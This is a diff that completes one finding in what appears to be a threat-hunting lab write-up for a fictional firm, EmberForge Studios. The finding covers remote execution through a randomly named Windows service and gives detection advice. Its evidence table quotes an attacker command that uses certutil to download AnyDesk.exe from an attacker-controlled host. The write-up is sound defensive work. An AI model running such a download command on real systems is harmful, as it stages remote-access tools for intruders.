@@ -150,7 +150,7 @@ A security breach was identified within EmberForge Studios, prompting a focused 
 | 29 | MITRE ATT&CK: T1055 – Process Injection | T1055 – Process Injection | <Placeholder> |
 | 30 | MITRE ATT&CK: T1021.002 – SMB/Windows Admin Shares | T1021 – Remote Services | <Placeholder> |
 | 31 | MITRE ATT&CK: T1105 – Ingress Tool Transfer | T1105 – Ingress Tool Transfer | <Placeholder> |
-| 32 | <Placeholder> | <Placeholder> | <Placeholder> |
+| 32 | MITRE ATT&CK: T1569.002 – Service Execution | T1569 – System Services | <Placeholder> |
 | 33 | <Placeholder> | <Placeholder> | <Placeholder> |
 | 34 | <Placeholder> | <Placeholder> | <Placeholder> |
 | 35 | <Placeholder> | <Placeholder> | <Placeholder> |
@@ -1621,23 +1621,33 @@ Search for command lines containing `certutil` + `http` or `https`. Pay special 
 <summary id="-flag-32">🚩 <strong>Flag 32: <Technique Name></strong></summary>
 
 ### 🎯 Objective
-<What the attacker was trying to accomplish>
+Execute commands remotely on the server by creating a temporary Windows service, enabling lateral movement and SYSTEM-level execution.
 
 ### 📌 Finding
-<High-level description of the activity>
+The attacker created a suspicious Windows service with a randomized name (`MzLbIBFm`) to execute commands remotely. The service leveraged `cmd.exe` to download and stage tools from attacker-controlled infrastructure, indicating service-based remote execution.
 
 ### 🔍 Evidence
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
-| Timestamp | <Placeholder> |
-| Process | <Placeholder> |
-| Parent Process | <Placeholder> |
-| Command Line | <Placeholder> |
+| Host | EC2AMAZ-16V3AU4.emberforge.local |
+| Timestamp | 2026-01-30 22:10:52 UTC (approx) |
+| Process | services.exe |
+| Parent Process | services.exe |
+| Command Line | %COMSPEC% /Q /c echo certutil -urlcache -split -f http://sync.cloud-endpoint.net:8080/AnyDesk.exe ... |
 
 ### 💡 Why it matters
-<Explain impact, risk, and relevance>
+Creating services with random names is a common attacker technique to:
+- Execute code remotely with **SYSTEM privileges**
+- Avoid detection by blending into legitimate service activity
+- Establish temporary or persistent execution mechanisms
+
+This behavior is strongly associated with tools like:
+- PsExec
+- Impacket (e.g., smbexec, psexec.py)
+- Custom service-based loaders
+
+It indicates **confirmed lateral movement and remote execution**, with the attacker now operating on a new host.
 
 ### 🔧 KQL Query Used
 EmberForgeX_CL
@@ -1650,9 +1660,23 @@ EmberForgeX_CL
 <img width="2270" height="844" alt="image" src="https://github.com/user-attachments/assets/a0d41c1f-1875-41c0-a065-f44074d31b82" />
 
 ### 🛠️ Detection Recommendation
+Monitor for:
+- Event ID **7045** (Service Creation) with unusual or random service names
+- Services executing `cmd.exe`, `powershell.exe`, or external downloads
+- Service ImagePath values containing encoded or chained commands
+- Short-lived services that are created and quickly removed
+
+Correlate with:
+- SMB connections (admin shares like C$)
+- File transfers to the same host
+- Prior credential access or privilege escalation activity
 
 **Hunting Tip:**  
-<Actionable guidance for defenders>
+Search for Event ID 7045 where:
+- Service names are random or non-standard
+- ImagePath includes `cmd.exe /c` or download utilities (certutil, powershell, bitsadmin)
+
+Randomized service names + command execution = **high-confidence remote execution indicator**.
 
 </details>
 
